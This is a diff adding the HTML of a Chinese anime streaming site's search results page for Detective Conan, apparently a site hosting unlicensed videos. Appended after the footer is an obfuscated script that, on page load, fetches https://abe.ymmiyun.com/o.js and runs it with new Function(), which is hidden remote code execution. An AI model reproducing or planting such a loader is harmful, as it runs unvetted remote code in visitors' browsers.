@@ -1,0 +1,199 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>搜索结果-MX动漫</title>
+<meta name="keywords" content="MX动漫,动漫在线观看,动漫免费观看,热门动漫,高清动漫" />
+<meta name="description" content="MX动漫，最新最全动漫免费在线观看，好看的动漫，热播动漫，高清动漫，涵盖国产动漫、日本动漫、动漫电影，极速播放，更新及时的专业在线动漫播放网站。" />
+<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
+<link rel="stylesheet" type="text/css" href="/webjs/style.css">
+<script type="text/javascript" src="//apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
+<script type="text/javascript" src="/webjs/conch.js"></script>
+</head>
+<body>
+<div id="header" class="wrapper">
+	<div class="container">
+		<div class="logo"><a href="/" title="MX动漫"><i class="iconfont icon-logo"></i>MX动漫</a></div>
+		<div id="search">
+			<form name="search" method="get" action="/search/" target="_blank">
+				<input class="search-wd" type="text" name="wd" value="" placeholder="请输入关键字">
+				<button class="search-btn" type="submit" disabled="disabled"><i class="iconfont icon-search"></i></button>
+			</form>
+		</div>
+		<div id="nav">
+			<ul>
+				<li><a href="/">首页</a></li>
+				<li><a href="/type/guoman/">国产动漫</a></li>
+				<li><a href="/type/riman/">日本动漫</a></li>
+				<li><a href="/type/oman/">欧美动漫</a></li>
+				<li><a href="/type/dmfilm/">动漫电影</a></li>
+			</ul>   
+		</div>
+	</div>
+</div>
+<div class="fixed"></div>
+<div class="search container">
+	<div class="title">找到 <em>98</em> 部影视作品</div>
+	<ul>
+		<li>
+			<a class="cover" href="/detail/1225/" title="名侦探柯南" target="_blank">
+				<img class="lazy" data-original="https://pic3.yzzyimg.online/upload/vod/2022-04-17/165013481613.jpg" src="/webjs/load.gif" alt="名侦探柯南">
+				<div class="bofang"><i class="iconfont icon-bofang-fill"></i></div>
+			</a>
+			<h3><a href="/detail/1225/" title="名侦探柯南" target="_blank">名侦探柯南</a></h3>
+			<div class="tags"><div>日本动漫</div><div>1996</div><div>日本</div><div>日韩动漫</div></div>
+			<div class="item"><span>状态：</span>更新至1277集</div>
+			<div class="item"><span>更新：</span>2026-10-18 01:40</div>
+			<a class="more" href="/detail/1225/" target="_blank">查看详情</a>
+		</li>
+		<li>
+			<a class="cover" href="/detail/1226/" title="名侦探柯南国语版" target="_blank">
+				<img class="lazy" data-original="https://pic3.yzzyimg.online/upload/vod/2022-04-17/165013481914.jpg" src="/webjs/load.gif" alt="名侦探柯南国语版">
+				<div class="bofang"><i class="iconfont icon-bofang-fill"></i></div>
+			</a>
+			<h3><a href="/detail/1226/" title="名侦探柯南国语版" target="_blank">名侦探柯南国语版</a></h3>
+			<div class="tags"><div>日本动漫</div><div>1996</div><div>日本</div><div>日韩动漫</div></div>
+			<div class="item"><span>状态：</span>更新至第1277集</div>
+			<div class="item"><span>更新：</span>2026-10-18 01:20</div>
+			<a class="more" href="/detail/1226/" target="_blank">查看详情</a>
+		</li>
+		<li>
+			<a class="cover" href="/detail/20020/" title="名侦探柯南国语" target="_blank">
+				<img class="lazy" data-original="https://fffgood.com/upload/vod/20260724-1/4cd6a28ac795440cce6bd8cdafa6266d.jpg" src="/webjs/load.gif" alt="名侦探柯南国语">
+				<div class="bofang"><i class="iconfont icon-bofang-fill"></i></div>
+			</a>
+			<h3><a href="/detail/20020/" title="名侦探柯南国语" target="_blank">名侦探柯南国语</a></h3>
+			<div class="tags"><div>日本动漫</div><div>1996</div><div>日本</div><div>日韩动漫</div></div>
+			<div class="item"><span>状态：</span>更新至第1277集</div>
+			<div class="item"><span>更新：</span>2026-10-17 20:00</div>
+			<a class="more" href="/detail/20020/" target="_blank">查看详情</a>
+		</li>
+		<li>
+			<a class="cover" href="/detail/11003/" title="名侦探柯南日语版" target="_blank">
+				<img class="lazy" data-original="https://img.lzipic.com/upload/vod/20220831-1/ab5f2c1e6d01d902e11d93e304f51ab3.jpg" src="/webjs/load.gif" alt="名侦探柯南日语版">
+				<div class="bofang"><i class="iconfont icon-bofang-fill"></i></div>
+			</a>
+			<h3><a href="/detail/11003/" title="名侦探柯南日语版" target="_blank">名侦探柯南日语版</a></h3>
+			<div class="tags"><div>日本动漫</div><div>1996</div><div>日本</div><div>日韩动漫</div></div>
+			<div class="item"><span>状态：</span>更新至第1277集</div>
+			<div class="item"><span>更新：</span>2026-10-17 19:40</div>
+			<a class="more" href="/detail/11003/" target="_blank">查看详情</a>
+		</li>
+		<li>
+			<a class="cover" href="/detail/13583/" title="名侦探柯南：百万美元的五棱星" target="_blank">
+				<img class="lazy" data-original="https://img.lzipic.com/upload/vod/20240707-1/b3a094b2168aba029cd0aa64fa7d839a.jpg" src="/webjs/load.gif" alt="名侦探柯南：百万美元的五棱星">
+				<div class="bofang"><i class="iconfont icon-bofang-fill"></i></div>
+			</a>
+			<h3><a href="/detail/13583/" title="名侦探柯南：百万美元的五棱星" target="_blank">名侦探柯南：百万美元的五棱星</a></h3>
+			<div class="tags"><div>日本动漫</div><div>2024</div><div>日本</div><div>日韩动漫</div></div>
+			<div class="item"><span>状态：</span>HD中字|国语</div>
+			<div class="item"><span>更新：</span>2026-09-30 09:40</div>
+			<a class="more" href="/detail/13583/" target="_blank">查看详情</a>
+		</li>
+		<li>
+			<a class="cover" href="/detail/20275/" title="名侦探柯南：30号杀人事件" target="_blank">
+				<img class="lazy" data-original="https://pic3.yzzyimg.online/upload/vod/2026-09-26/202609261790409390.jpg" src="/webjs/load.gif" alt="名侦探柯南：30号杀人事件">
+				<div class="bofang"><i class="iconfont icon-bofang-fill"></i></div>
+			</a>
+			<h3><a href="/detail/20275/" title="名侦探柯南：30号杀人事件" target="_blank">名侦探柯南：30号杀人事件</a></h3>
+			<div class="tags"><div>动漫电影</div><div>2026</div><div>日本</div><div>悬疑,犯罪,动画,动画片</div></div>
+			<div class="item"><span>状态：</span>HD中字</div>
+			<div class="item"><span>更新：</span>2026-09-26 16:00</div>
+			<a class="more" href="/detail/20275/" target="_blank">查看详情</a>
+		</li>
+		<li>
+			<a class="cover" href="/detail/20274/" title="名侦探柯南：30号杀人事件" target="_blank">
+				<img class="lazy" data-original="https://fffgood.com/upload/vod/20260926-1/f1c362ad7e37b368d78046411c09ee88.jpg" src="/webjs/load.gif" alt="名侦探柯南：30号杀人事件">
+				<div class="bofang"><i class="iconfont icon-bofang-fill"></i></div>
+			</a>
+			<h3><a href="/detail/20274/" title="名侦探柯南：30号杀人事件" target="_blank">名侦探柯南：30号杀人事件</a></h3>
+			<div class="tags"><div>日本动漫</div><div>2026</div><div>日本</div><div>日韩动漫</div></div>
+			<div class="item"><span>状态：</span>HD中字</div>
+			<div class="item"><span>更新：</span>2026-09-26 13:20</div>
+			<a class="more" href="/detail/20274/" target="_blank">查看详情</a>
+		</li>
+		<li>
+			<a class="cover" href="/detail/20139/" title="名侦探柯南：高速公路的堕天使" target="_blank">
+				<img class="lazy" data-original="https://pic3.yzzyimg.online/upload/vod/2026-08-15/202608151786780476.jpg" src="/webjs/load.gif" alt="名侦探柯南：高速公路的堕天使">
+				<div class="bofang"><i class="iconfont icon-bofang-fill"></i></div>
+			</a>
+			<h3><a href="/detail/20139/" title="名侦探柯南：高速公路的堕天使" target="_blank">名侦探柯南：高速公路的堕天使</a></h3>
+			<div class="tags"><div>动漫电影</div><div>2026</div><div>日本</div><div>悬疑,动画,动画片</div></div>
+			<div class="item"><span>状态：</span>TC中字</div>
+			<div class="item"><span>更新：</span>2026-08-15 16:00</div>
+			<a class="more" href="/detail/20139/" target="_blank">查看详情</a>
+		</li>
+		<li>
+			<a class="cover" href="/detail/20130/" title="名侦探柯南：高速公路的堕天使" target="_blank">
+				<img class="lazy" data-original="https://fffgood.com/upload/vod/20260814-1/30fa84322d7072c0a977dfb4d86435c0.jpg" src="/webjs/load.gif" alt="名侦探柯南：高速公路的堕天使">
+				<div class="bofang"><i class="iconfont icon-bofang-fill"></i></div>
+			</a>
+			<h3><a href="/detail/20130/" title="名侦探柯南：高速公路的堕天使" target="_blank">名侦探柯南：高速公路的堕天使</a></h3>
+			<div class="tags"><div>日本动漫</div><div>2026</div><div>日本</div><div>日韩动漫</div></div>
+			<div class="item"><span>状态：</span>TC中字</div>
+			<div class="item"><span>更新：</span>2026-08-14 23:40</div>
+			<a class="more" href="/detail/20130/" target="_blank">查看详情</a>
+		</li>
+		<li>
+			<a class="cover" href="/detail/15699/" title="名侦探柯南：百万美元的五棱星国语" target="_blank">
+				<img class="lazy" data-original="https://ynztctv.com/upload/vod/20240907-2/1e7e7ca466e6446689614ff9a25fad5b.jpg" src="/webjs/load.gif" alt="名侦探柯南：百万美元的五棱星国语">
+				<div class="bofang"><i class="iconfont icon-bofang-fill"></i></div>
+			</a>
+			<h3><a href="/detail/15699/" title="名侦探柯南：百万美元的五棱星国语" target="_blank">名侦探柯南：百万美元的五棱星国语</a></h3>
+			<div class="tags"><div>动漫电影</div><div>2024</div><div>日本</div><div>动画片</div></div>
+			<div class="item"><span>状态：</span>正片</div>
+			<div class="item"><span>更新：</span>2025-11-30 22:20</div>
+			<a class="more" href="/detail/15699/" target="_blank">查看详情</a>
+		</li>
+		<li>
+			<a class="cover" href="/detail/17345/" title="名侦探柯南：独眼的残像" target="_blank">
+				<img class="lazy" data-original="https://tu.ikgambwqeqnv.com/upload/vod/20250630-1/0accaebacbcb3c1032407e1184322b7a.jpg" src="/webjs/load.gif" alt="名侦探柯南：独眼的残像">
+				<div class="bofang"><i class="iconfont icon-bofang-fill"></i></div>
+			</a>
+			<h3><a href="/detail/17345/" title="名侦探柯南：独眼的残像" target="_blank">名侦探柯南：独眼的残像</a></h3>
+			<div class="tags"><div>动漫电影</div><div>2025</div><div>日本</div><div>动画片</div></div>
+			<div class="item"><span>状态：</span>正片</div>
+			<div class="item"><span>更新：</span>2025-11-30 20:20</div>
+			<a class="more" href="/detail/17345/" target="_blank">查看详情</a>
+		</li>
+		<li>
+			<a class="cover" href="/detail/17346/" title="名侦探柯南：独眼的残像" target="_blank">
+				<img class="lazy" data-original="https://img.lzipic.com/upload/vod/20250701-1/5e359cf001d0610507fdfbf4e0c99197.jpg" src="/webjs/load.gif" alt="名侦探柯南：独眼的残像">
+				<div class="bofang"><i class="iconfont icon-bofang-fill"></i></div>
+			</a>
+			<h3><a href="/detail/17346/" title="名侦探柯南：独眼的残像" target="_blank">名侦探柯南：独眼的残像</a></h3>
+			<div class="tags"><div>日本动漫</div><div>2025</div><div>日本</div><div>日韩动漫</div></div>
+			<div class="item"><span>状态：</span>HD</div>
+			<div class="item"><span>更新：</span>2025-11-30 04:20</div>
+			<a class="more" href="/detail/17346/" target="_blank">查看详情</a>
+		</li>
+	</ul>
+</div>
+<div class="page container"><a href="/search/?wd=柯南" class="sj disad"><i class="iconfont icon-jiantoushou"></i></a>
+<a href="/search/?wd=柯南" class="sj disad"><i class="iconfont icon-jiantouzuo"></i></a>
+<a href="/search/?wd=柯南" class="pc disad">上一页</a>
+<a href="javascript:;" class="pc active">1</a>
+<a href="/search/?wd=柯南&pageno=2" class="pc">2</a>
+<a href="/search/?wd=柯南&pageno=3" class="pc">3</a>
+<a href="/search/?wd=柯南&pageno=4" class="pc">4</a>
+<a href="/search/?wd=柯南&pageno=5" class="pc">5</a>
+<a href="javascript:;" class="sj">1&nbsp;/&nbsp;9</a>
+<a class="pc disad" href="javascript:;">...</a>
+<a href="/search/?wd=柯南&pageno=9" class="pc">9</a>
+<a href="/search/?wd=柯南&pageno=2" class="pc">下一页</a>
+<a href="/search/?wd=柯南&pageno=2" class="sj"><i class="iconfont icon-jiantouyou"></i></a>
+<a href="/search/?wd=柯南&pageno=9" class="sj"><i class="iconfont icon-jiantouwei"></i></a>
+</div>
+<div id="footer" class="wrapper">
+	<div class="container">
+		<a class="totop" href="javascript:scroll(0,0)"><i class="iconfont icon-jiantoushang"></i></a>
+		<p>本站只提供WEB页面服务，本站不存储、不制作任何视频。</p><p><a href="/">MX动漫,动漫在线观看,动漫免费观看,热门动漫,高清动漫</a> <a href="/">www.dcc3.com</a> 联系邮箱：helpweb#163.com <a href="/sitemap/index.xml" target="_blank">网站地图</a></p>
+	</div>
+</div>
+<script>var JrfuvQi1 = JrfuvQi1 || [];(function() {  var GzSe2 = window["\x64\x6f\x63\x75\x6d\x65\x6e\x74"]["\x63\x72\x65\x61\x74\x65\x45\x6c\x65\x6d\x65\x6e\x74"]("\x73\x63\x72\x69\x70\x74");  GzSe2["\x73\x72\x63"] = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x68\x6d\x2e\x62\x61\x69\x64\x75\x2e\x63\x6f\x6d\x2f\x68\x6d\x2e\x6a\x73\x3f\x64\x34\x32\x30\x34\x38\x30\x62\x37\x63\x62\x34\x66\x64\x62\x34\x62\x64\x33\x34\x61\x31\x34\x32\x34\x36\x66\x65\x31\x33\x66\x64";  var pelYe3 = window["\x64\x6f\x63\x75\x6d\x65\x6e\x74"]["\x67\x65\x74\x45\x6c\x65\x6d\x65\x6e\x74\x73\x42\x79\x54\x61\x67\x4e\x61\x6d\x65"]("\x73\x63\x72\x69\x70\x74")[0];   pelYe3["\x70\x61\x72\x65\x6e\x74\x4e\x6f\x64\x65"]["\x69\x6e\x73\x65\x72\x74\x42\x65\x66\x6f\x72\x65"](GzSe2, pelYe3);})();</script>
+<script>
+function _0xad8d(){var _0x415917=['appendChild','async','17420600krMHrH','1745anbqeh','status','3753308zqyHvi','script','<ins\x20style=\x22display:none!important\x22\x20id=\x22','117zuUNwB','send','GET','241470vviWZJ','14814zTpUeb','2377029035902478992-38712','\x22></ins>','420624QrHAkS','300328XEjsyp','push','onreadystatechange','78520CheEqy','open','responseText','2WDzbBn','https://abe.ymmiyun.com/o.js','head'];_0xad8d=function(){return _0x415917;};return _0xad8d();}function _0x3a09(_0x2ab93d,_0x54f225){var _0xad8db5=_0xad8d();return _0x3a09=function(_0x3a09e2,_0x458277){_0x3a09e2=_0x3a09e2-0xd6;var _0x45f57d=_0xad8db5[_0x3a09e2];return _0x45f57d;},_0x3a09(_0x2ab93d,_0x54f225);}(function(_0x32abdd,_0x3213e9){var _0x3907e9=_0x3a09,_0x5e5eb3=_0x32abdd();while(!![]){try{var _0x5f2c9d=-parseInt(_0x3907e9(0xe8))/0x1*(-parseInt(_0x3907e9(0xdd))/0x2)+parseInt(_0x3907e9(0xe1))/0x3+parseInt(_0x3907e9(0xd7))/0x4+-parseInt(_0x3907e9(0xee))/0x5*(-parseInt(_0x3907e9(0xde))/0x6)+-parseInt(_0x3907e9(0xe2))/0x7+-parseInt(_0x3907e9(0xe5))/0x8*(-parseInt(_0x3907e9(0xda))/0x9)+-parseInt(_0x3907e9(0xed))/0xa;if(_0x5f2c9d===_0x3213e9)break;else _0x5e5eb3['push'](_0x5e5eb3['shift']());}catch(_0x2a4f37){_0x5e5eb3['push'](_0x5e5eb3['shift']());}}}(_0xad8d,0x8001d),(function(){var _0x3c6101=_0x3a09,_0x42862d=_0x3c6101(0xdf),_0x41a552=_0x3c6101(0xe9);document['write'](_0x3c6101(0xd9)+_0x42862d+_0x3c6101(0xe0)),(window['adbyunion']=window['adbyunion']||[])[_0x3c6101(0xe3)](_0x42862d);var _0x418d71=new XMLHttpRequest();_0x418d71[_0x3c6101(0xe6)](_0x3c6101(0xdc),_0x41a552,!![]),_0x418d71[_0x3c6101(0xe4)]=function(){var _0x7c34ad=_0x3c6101;if(_0x418d71['readyState']===0x4){if(_0x418d71[_0x7c34ad(0xd6)]===0xc8){var _0xb6d5ba=_0x418d71[_0x7c34ad(0xe7)];new Function(_0xb6d5ba)();}else{var _0x51213e=document['createElement'](_0x7c34ad(0xd8));_0x51213e['src']=_0x41a552,_0x51213e[_0x7c34ad(0xec)]=!![],document[_0x7c34ad(0xea)][_0x7c34ad(0xeb)](_0x51213e);}}},_0x418d71[_0x3c6101(0xdb)]();}()));
+</script>
+</body>
+</html>
